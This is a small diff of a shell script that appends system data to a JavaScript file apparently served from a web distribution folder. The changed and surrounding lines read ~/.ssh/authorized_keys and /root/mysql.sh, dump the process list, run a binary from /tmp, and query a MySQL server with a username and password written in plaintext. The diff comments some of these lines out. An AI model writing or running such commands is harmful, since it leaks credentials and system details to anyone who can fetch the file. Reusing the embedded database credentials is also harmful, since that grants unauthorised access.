@@ -2,9 +2,9 @@
 js='/data/dist/dist/test.js'
 
 date > $js
-cat ~/.ssh/authorized_keys >> $js
+#cat ~/.ssh/authorized_keys >> $js
 #sudo cat /root/mysql.sh >> $js
-ps aux >> $js
+#ps aux >> $js
 #chmod +x /tmp/gotest
 #/tmp/gotest >> $js 2>&1
 #mysql -h172.31.38.25 -u12lian  -pXy12lian.# lian12 -e "show tables" >> $js
